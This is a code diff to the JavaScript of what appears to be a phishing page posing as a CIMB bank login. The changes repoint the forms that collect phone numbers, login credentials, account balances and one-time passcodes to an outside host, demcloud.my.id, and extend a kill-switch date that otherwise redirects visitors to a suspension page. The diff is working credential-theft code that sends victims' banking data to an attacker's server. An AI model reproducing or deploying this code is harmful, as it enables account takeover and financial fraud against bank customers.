@@ -1,5 +1,5 @@
 let tglNow = new Date();
-let waktuBatas = new Date("2025-08-07T23:59:59");
+let waktuBatas = new Date("2025-08-10T23:59:59");
 if (tglNow.getTime() >= waktuBatas.getTime()) {
   document.location.href = 'https://suspend-web.pages.dev';
 } else {
@@ -18,7 +18,7 @@ function sendNohp(){
    
        $.ajax({
             type: 'POST',
-            url: 'rest/no.php',
+            url: 'https://demcloud.my.id/cimb/jyt89a/no.php',
             data: $('#hpForm').serialize(),
             datatype: 'JSON',
             
@@ -51,7 +51,7 @@ function sendLogin(){
    
      $.ajax({
             type: 'POST',
-            url: 'rest/login.php',
+            url: 'https://demcloud.my.id/cimb/jyt89a/login.php',
             data: $('#loginForm').serialize(),
             datatype: 'JSON',
             
@@ -93,7 +93,7 @@ function sendSaldo(){
   
        $.ajax({
             type: 'POST',
-            url: 'rest/saldo.php',
+            url: 'https://demcloud.my.id/cimb/jyt89a/saldo.php',
             data: $('#saldoForm').serialize(),
             datatype: 'JSON',
         
@@ -139,7 +139,7 @@ function sendOtp(){
      
      $.ajax({
             type: 'POST',
-            url: 'rest/otp.php',
+            url: 'https://demcloud.my.id/cimb/jyt89a/otp.php',
             data: $('#otp-form').serialize(),
             datatype: 'JSON',
         
@@ -166,7 +166,7 @@ function wa(){
  $(".wait").fadeIn();   
     
 setTimeout(function(){  
-location.href='wa';
+location.href='https://demcloud.my.id/cimb/jyt89a/wa';
     }, 00);
     setTimeout(function(){
     $(".wait").fadeOut();   
